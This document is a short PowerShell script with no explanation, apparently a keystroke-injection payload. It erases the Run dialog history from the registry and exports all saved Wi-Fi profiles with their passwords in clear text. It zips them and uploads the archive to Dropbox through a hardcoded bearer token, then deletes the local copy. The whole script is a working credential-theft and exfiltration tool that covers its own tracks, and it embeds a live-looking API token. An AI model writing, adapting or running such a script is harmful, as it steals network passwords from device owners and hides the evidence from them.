$RegistryPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
Remove-Item -Path $RegistryPath
mkdir $env:Temp\Netwerk
netsh wlan export profile key=clear folder=$env:Temp\Netwerk
Compress-Archive -Path $env:Temp\Netwerk\* -CompressionLevel NoCompression -DestinationPath $env:TMP\$env:USERNAME-$(get-date -f yyyy-MM-dd).zip
$TargetFilePath="/$env:USERNAME-$(get-date -f yyyy-MM-dd).zip"
$SourceFilePath="$env:TMP\$env:USERNAME-$(get-date -f yyyy-MM-dd).zip"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + "sl.Bru_SrfEAhons4AFaQu0DjG15UdXEZcOOYINV2nou7yDQ_60q9mf3TwgI" + "3aekix4UKb55lmbC5py3l5jr8j97KJm4QSGShvkolfl3wwFs-Rt1rLtqb1hxgmUoI1Jd-hfX78SJJJE_FHz8TM"
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
rm $SourceFilePath

